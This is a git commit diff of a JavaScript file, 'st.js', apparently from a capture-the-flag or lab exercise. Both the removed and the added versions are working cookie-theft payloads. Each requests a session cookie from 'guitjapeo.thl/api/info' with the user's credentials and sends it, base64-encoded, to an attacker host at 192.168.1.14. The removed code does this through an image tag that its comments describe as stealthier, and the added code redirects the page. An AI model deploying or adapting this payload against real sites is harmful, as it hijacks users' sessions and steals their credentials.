53c448f3bcbefc544bd9281e8fd80d466582a33c
murrusko <157688419+murrusko@users.noreply.github.com>
2024-09-24 16:06:15 +0200

    Actualizar st.js

--- st.js
+++ st.js
@@ -1,16 +1,11 @@
-// Make a GET request to the target API
-fetch("https://guitjapeo.thl/api/info", {
-    method: 'GET',
-    credentials: 'include'  // Automatically includes cookies like session cookies
-})
-.then(response => response.json())  // Parse the response as JSON
-.then(data => {
-    const sess = data.cookie;  // Extract the session cookie or token
-    const encodedSess = encodeURIComponent(btoa(sess));  // Base64 encode the session token and URL-encode it
-
-    // Use an image tag to exfiltrate data to avoid triggering CORS and to make it stealthier
-    let img = new Image();
-    img.src = "http://192.168.1.14/log?data=" + encodedSess;  // Send the stolen cookie to the attacker's server
-})
-.catch(error => console.error('Request failed', error));  // Handle errors
-
+var req = new XMLHttpRequest();
+req.onload=reqListener;
+var url="https://guitjapeo.thl/api/info";
+req.withCredentials=true;
+req.open("GET",url,false);
+req.send();
+function reqListener() {
+    var req2=new XMLHttpRequest();
+    const sess=JSON.parse(this.responseText).cookie;
+    location.href="http://192.168.1.14/?data="+btoa(sess);
+};
